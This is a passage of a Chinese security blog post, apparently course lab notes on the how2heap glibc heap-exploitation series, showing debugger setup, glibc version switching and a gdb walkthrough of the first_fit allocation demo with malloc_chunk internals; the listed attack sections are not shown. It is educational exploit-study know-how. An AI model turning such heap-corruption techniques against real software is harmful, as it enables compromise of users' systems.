<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>How2heap系列 | M@tr1xの日常</title><meta name="description" content="tags: []categories: []cover: “”​  实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6即可看到版本   安装 pwngdb+pwndbg参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43092232&#x2F;article&#x2F;details&#x2F;105648769配置如下 how2hea"><meta name="keywords" content="CTF,白帽子,Pwn,Web"><meta name="author" content="M@tr1x"><meta name="copyright" content="M@tr1x"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="UA-157542666-1"/><meta property="og:type" content="article"><meta property="og:title" content="How2heap系列"><meta property="og:url" content="https://www.blog.hackerjerry.top/2021/05/31/How2heap%E7%B3%BB%E5%88%97_new/"><meta property="og:site_name" content="M@tr1xの日常"><meta property="og:description" content="tags: []categories: []cover: “”​  实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6即可看到版本   安装 pwngdb+pwndbg参考https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43092232&#x2F;article&#x2F;details&#x2F;105648769配置如下 how2hea"><meta property="og:image" content="https://image.hackerjerry.top/2427682894.jpeg"><meta property="article:published_time" content="2021-05-31T03:51:02.000Z"><meta property="article:modified_time" content="2021-07-21T12:45:15.767Z"><meta name="twitter:card" content="summary"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  hexoversion: '5.1.1',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime: '天',
  last_push_date: {"zeroDay":"今天","suffix":"天前"},
  copyright: {"limitCount":50,"languages":{"author":"作者: M@tr1x","link":"链接: ","source":"来源: M@tr1xの日常","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: false,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
      const now = new Date()
      const expiryDay = ttl * 86400000
      const item = {
        value: value,
        expiry: now.getTime() + expiryDay,
      }
      localStorage.setItem(key, JSON.stringify(item))
    },
  
  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-07-21 20:45:15'
}</script><noscript><style type="text/css">
#nav {
  opacity: 1
}
.justified-gallery img {
  opacity: 1
}
</style></noscript><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var autoChangeMode = 'false'
var t = saveToLocal.get('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (saveToLocal.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="M@tr1xの日常" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">74</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">45</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">15</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fa fa-film"></i><span> 追番</span></a></li><li><a class="site-page" href="/artalk/"><i class="fa-fw fa-fw fa fa-comment-alt"></i><span> 说说</span></a></li></ul></div></div></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E8%A3%85-pwngdb-pwndbg"><span class="toc-number">1.</span> <span class="toc-text">安装 pwngdb+pwndbg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">how2heap 概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%87%E6%8D%A2-glibc-%E7%89%88%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">切换 glibc 版本</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#first-fit-2-28"><span class="toc-number">4.</span> <span class="toc-text">first_fit-2.28</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#large-bin-attack-2-23"><span class="toc-number">5.</span> <span class="toc-text">large_bin_attack-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#overlapping-chunks-2-23"><span class="toc-number">6.</span> <span class="toc-text">overlapping_chunks-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#overlapping-chunks-2-2-23"><span class="toc-number">7.</span> <span class="toc-text">overlapping_chunks_2-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mmap-overlapping-chunks-2-28"><span class="toc-number">8.</span> <span class="toc-text">mmap_overlapping_chunks-2.28</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#poison-null-byte-2-23"><span class="toc-number">9.</span> <span class="toc-text">poison_null_byte-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsorted-bin-attack-2-23"><span class="toc-number">10.</span> <span class="toc-text">unsorted_bin_attack-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#unsorted-bin-into-stack-2-23"><span class="toc-number">11.</span> <span class="toc-text">unsorted_bin_into_stack-2.23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%84%E5%BD%95"><span class="toc-number">12.</span> <span class="toc-text">附录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwngdb"><span class="toc-number">12.1.</span> <span class="toc-text">Pwngdb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwndbg"><span class="toc-number">12.2.</span> <span class="toc-text">pwndbg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#peda-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">12.3.</span> <span class="toc-text">peda 基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#peda-%E6%8F%92%E4%BB%B6%E5%91%BD%E4%BB%A4"><span class="toc-number">12.4.</span> <span class="toc-text">peda 插件命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E5%8F%82%E8%80%83"><span class="toc-number">13.</span> <span class="toc-text">主要参考</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">14.</span> <span class="toc-text">后记</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://image.hackerjerry.top/2427682894.jpeg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">M@tr1xの日常</a></span><span class="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-list"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fa fa-film"></i><span> 追番</span></a></li><li><a class="site-page" href="/artalk/"><i class="fa-fw fa-fw fa fa-comment-alt"></i><span> 说说</span></a></li></ul></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">How2heap系列</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-31T03:51:02.000Z" title="发表于 2021-05-31 11:51:02">2021-05-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-21T12:45:15.767Z" title="更新于 2021-07-21 20:45:15">2021-07-21</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><p>tags: []<br>categories: []<br>cover: “”<br>​</p>
<hr>
<p>实验使用 wsl 进行，具体的 glibc 版本为 2.28，运行<code>/lib/x86_64-linux-gnu/libc.so.6</code>即可看到版本<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-1.png#clientId=u347f053a-7aac-4&from=paste&height=121&id=ubcbe185e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=241&originWidth=756&originalType=binary&size=264115&status=done&style=none&taskId=u396bde25-eab2-4a06-bb3b-c2811987e8d&width=378" alt="image.png"></p>
<a id="more"></a>

<h1 id="安装-pwngdb-pwndbg"><a href="#安装-pwngdb-pwndbg" class="headerlink" title="安装 pwngdb+pwndbg"></a>安装 pwngdb+pwndbg</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105648769">https://blog.csdn.net/weixin_43092232/article/details/105648769</a><br>配置如下<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-2.png#clientId=u347f053a-7aac-4&from=paste&height=181&id=udbe3c4f1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=534&originalType=binary&size=278719&status=done&style=none&taskId=u86b81336-450f-40db-a685-ef4ce0a2429&width=267" alt="image.png"></p>
<h1 id="how2heap-概述"><a href="#how2heap-概述" class="headerlink" title="how2heap 概述"></a>how2heap 概述</h1><p><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-3.png#clientId=u347f053a-7aac-4&from=paste&height=328&id=u094da593&margin=%5Bobject%20Object%5D&name=image.png&originHeight=656&originWidth=1195&originalType=binary&size=115449&status=done&style=none&taskId=ua9828c89-666f-4095-af6d-4a8310c5693&width=597.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-4.png#clientId=u347f053a-7aac-4&from=paste&height=357&id=ued1b9be3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=714&originWidth=1202&originalType=binary&size=131426&status=done&style=none&taskId=u62e23b01-92b3-4bf2-9bf4-b40d8099d96&width=601" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-5.png#clientId=u347f053a-7aac-4&from=paste&height=324&id=udf398312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=648&originWidth=1206&originalType=binary&size=141433&status=done&style=none&taskId=ueb73bcb6-30ef-4add-ac3a-64f6fa81b36&width=603" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-6.png#clientId=u347f053a-7aac-4&from=paste&height=89&id=uca37f774&margin=%5Bobject%20Object%5D&name=image.png&originHeight=178&originWidth=1199&originalType=binary&size=41410&status=done&style=none&taskId=u510b02f8-c5d4-432b-a698-2fe503733f1&width=599.5" alt="image.png"></p>
<h1 id="切换-glibc-版本"><a href="#切换-glibc-版本" class="headerlink" title="切换 glibc 版本"></a>切换 glibc 版本</h1><p>不到万不得已，不用<code>apt-get install libc-bin=2.24-11+deb9u1 libc6=2.24-11+deb9u1</code></p>
<blockquote>
<p>这个版本是通过</p>
</blockquote>
<p>glibc 是动态链接库<br>所以可以指定程序的任意 glibc 版本哦，ubuntu 的 glibc-all-in-one 也可以直接用在 debian 上的！<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-7.png#clientId=u347f053a-7aac-4&from=paste&height=238&id=u630ec27f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=476&originWidth=1052&originalType=binary&size=450517&status=done&style=none&taskId=u55f4ef69-a967-440a-977e-c93ae10ee37&width=526" alt="image.png"><br>然后参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45595732/article/details/115385790">https://blog.csdn.net/qq_45595732/article/details/115385790</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/kaleido76/pwn/fn4432">https://www.yuque.com/kaleido76/pwn/fn4432</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/juluwangriyue/article/details/108617283">https://blog.csdn.net/juluwangriyue/article/details/108617283</a><br>并运行类似<br><code>patchelf --set-interpreter /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so overlapping1</code></p>
<p><code>patchelf --set-rpath /mnt/f/桌面/大三下/软件安全/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 overlapping1 </code><br>​</p>
<p>大功告成<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-8.png#clientId=u347f053a-7aac-4&from=paste&height=175&id=ud788b965&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=1285&originalType=binary&size=367384&status=done&style=none&taskId=u5b431fbb-b35d-4966-ad37-114dee52ab6&width=642.5" alt="image.png"></p>
<h1 id="first-fit-2-28"><a href="#first-fit-2-28" class="headerlink" title="first_fit-2.28"></a>first_fit-2.28</h1><p>这里没有任何攻击，说的是 glibc 分配内存的方式是最先适应算法，空闲块按地址递增的顺序排列，只要求分配空间大小小于该空闲空间大小，就可以分配。实例中给了分配两个 chunk，大小分别为 512 和 256，大于 fastbin，然后写入数据并释放第一个 512chunk，释放的 chunk 在 unsorted bin 之中，之后再分配 500 字节。此时由于 glibc 机制，直接在 unsorted bin 中找到并将其分割，一部分给用户，另一部分保留，所以第三个 chunk 指针与之前第一个 chunk 的相同。<br>我们首先编译<code>gcc first_fit.c -o first -g</code><br>然后<code>gdb first</code>进行调试<br>首先，输入 start<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-9.png#clientId=u347f053a-7aac-4&from=paste&height=345&id=ud7ff854b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=651&originWidth=1122&originalType=binary&size=1125083&status=done&style=none&taskId=u865c97c4-9a62-4c88-9ec7-fb5a1836f15&width=595" alt="image.png"><br>然后查看堆内存<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-10.png#clientId=u347f053a-7aac-4&from=paste&height=56&id=ua939020c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=85&originWidth=393&originalType=binary&size=47039&status=done&style=none&taskId=u8d8fb7a1-4131-4495-a082-a96510f4dc6&width=259.5" alt="image.png"><br>可以看到还是没有的<br>然后 n 单步运行过 13 行，再次运行 heap，可以看到<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-11.png#clientId=u347f053a-7aac-4&from=paste&height=439&id=udab41a45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=878&originWidth=1160&originalType=binary&size=1557884&status=done&style=none&taskId=u232dd3dc-7d9b-4606-9589-d112211794b&width=580" alt="image.png"><br>即第一个 a 的地址就是 0x8005250，然后我们继续分配 b<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-12.png#clientId=u347f053a-7aac-4&from=paste&height=222&id=uf4233992&margin=%5Bobject%20Object%5D&name=image.png&originHeight=443&originWidth=501&originalType=binary&size=323156&status=done&style=none&taskId=u60f56a96-0f5d-4938-80fd-aa9847763cb&width=250.5" alt="image.png"><br>可以发现 b 的地址是 0x8005770<br>而输出的数据是：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-13.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=u0a63667d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=57&originWidth=321&originalType=binary&size=26195&status=done&style=none&taskId=u605230af-8d93-4b13-b34e-467e78437e4&width=160.5" alt="image.png"><br>这是因为我们知道 chunk 指针返回的是 mem 数据部分，chunk 在使用时的数据结构如下图：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    An allocated chunk looks like <span class="keyword">this</span>:</span><br><span class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             User data starts here...                          .</span><br><span class="line">	    .                                                               .</span><br><span class="line">	    .             (malloc_usable_size() bytes)                      .</span><br><span class="line">	    .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             (size of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">	    |             Size of next chunk, in bytes                |A|<span class="number">0</span>|<span class="number">1</span>|</span><br><span class="line">	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中 chunk 定义的结构体如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>每个字段的具体的解释如下</p>
<ul>
<li><strong>prev_size</strong>, 如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。**这里的前一 chunk 指的是较低地址的 chunk **。</li>
<li><strong>size</strong> ，该 chunk 的大小，大小必须是 2 _ SIZE_SZ 的整数倍。如果申请的内存大小不是 2 _ SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示<ul>
<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。</li>
</ul>
</li>
<li><strong>fd，bk</strong>。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下<ul>
<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
</ul>
</li>
<li><strong>fd_nextsize， bk_nextsize</strong>，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。<ul>
<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
</ul>
</li>
</ul>
<p>也就是说 malloc 返回的指针就是 chunk 的 fd 指针处，返回内存指针地址-0x10 是 chunk 块的真正头部。<br>这个时候我们可以查看以下两个 chunk 的结构：<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-14.png#clientId=u347f053a-7aac-4&from=paste&height=39&id=u3578e819&margin=%5Bobject%20Object%5D&name=image.png&originHeight=78&originWidth=568&originalType=binary&size=60756&status=done&style=none&taskId=ud82be738-496f-4ff0-8b81-3c5a2fd229c&width=284" alt="image.png"><br>验证了我们的想法</p>
<blockquote>
<p>GDB 调试查看 Chunk 内存的时候，在 32 位系统的时候用 w（四字节 32 位），在 64 位系统的时候用 g（八字节 64 位）</p>
</blockquote>
<p>这时候我们往 a 的内存里面写入了”this is A!”的数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-15.png#clientId=u347f053a-7aac-4&from=paste&height=297&id=u2a9dd95c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=951&originalType=binary&size=779596&status=done&style=none&taskId=u7c309d88-ed9c-4395-af94-51e0ef3120c&width=475.5" alt="image.png"><br>查看指针处数据<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-16.png#clientId=u347f053a-7aac-4&from=paste&height=40&id=uc43258b2&name=image.png&originHeight=80&originWidth=557&originalType=binary&size=61038&status=done&style=none&taskId=u36a0855c-611f-4636-8b65-a085361d73f&width=278.5" alt="image.png"><br>写入的数据就是上述字符串的 ASCII 码<br>当我们执行 free(a)释放 a 的内存块后，可以发现 a 先被放入了 unsortedbin 中，且 fd 指针和 bk 指针都指向了 main_arena<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-17.png#clientId=u347f053a-7aac-4&from=paste&height=471&id=uaab4248c&name=image.png&originHeight=941&originWidth=1113&originalType=binary&size=1596503&status=done&style=none&taskId=u46c0ff91-6ad9-4fbc-b7d0-fe90583f478&width=556.5" alt="image.png"><br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-18.png#clientId=u347f053a-7aac-4&from=paste&height=225&id=u3f41a094&margin=%5Bobject%20Object%5D&name=image.png&originHeight=449&originWidth=864&originalType=binary&size=548857&status=done&style=none&taskId=u1a73c58c-a933-4d02-afde-ce7d7e95359&width=432" alt="image.png"><br>执行 c = malloc(0x500)，发现 c 分配到的内存块就是原来 a 分配到的内存块<br><img src= "/img/loading.gif" data-lazy-src="https://image.hackerjerry.top/How2heap%E7%B3%BB%E5%88%97-19.png#clientId=u347f053a-7aac-4&from=paste&height=457&id=u07255dc9&name=image.png&originHeight=913&originWidth=954&originalType=binary&size=1290624&status=done&style=none&taskId=u8044fb4e-a813-4d6d-8367-2d0ae72e4ac&width=477" alt="image.png"><br><img src= "/img/loading.gif" 